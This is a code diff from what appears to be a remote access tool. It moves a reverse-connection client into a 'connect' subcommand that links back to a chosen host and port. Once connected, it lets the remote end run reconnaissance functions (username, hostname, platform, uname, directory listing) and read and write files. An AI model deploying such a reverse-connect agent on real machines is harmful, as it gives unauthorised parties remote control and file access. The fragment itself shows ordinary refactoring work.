@@ -82,6 +82,34 @@ class FileService(payload.FileOpener, payload.FileReader, payload.FileWriter):
     pass
 
 
+def _linux_connect(args):
+    host, port = addr = args.host, args.port
+
+    with ReverseClient(addr) as client:
+        funcs = [
+                payload.get_username,
+                payload.get_hostname,
+                payload.get_platform,
+                payload.list_dir,
+                payload.change_dir,
+                payload.get_current_dir,
+                payload.get_file_size,
+                payload.uname,
+        ]
+        for f in funcs:
+            client.register_function(f)
+        client.register_instance(FileService())
+        try:
+            client.serve_forever()
+        except connection.ConnectionClosed:
+            pass
+
+
+def _linux_listen(args):
+    print(args)
+    print('listening')
+
+
 def _windows_main(args):
     raise NotImplementedError
 
@@ -126,29 +154,11 @@ def _linux_main(args):
     )
 
     args = parser.parse_args(args)
-    print(args)
-    return
 
-    host, port = addr = args.host, args.port
-
-    with ReverseClient(addr) as client:
-        funcs = [
-                payload.get_username,
-                payload.get_hostname,
-                payload.get_platform,
-                payload.list_dir,
-                payload.change_dir,
-                payload.get_current_dir,
-                payload.get_file_size,
-                payload.uname,
-        ]
-        for f in funcs:
-            client.register_function(f)
-        client.register_instance(FileService())
-        try:
-            client.serve_forever()
-        except connection.ConnectionClosed:
-            pass
+    if args.command == 'connect':
+        _linux_connect(args)
+    elif args.command == 'listen':
+        _linux_listen(args)
 
 
 if platform.system() == 'Windows':
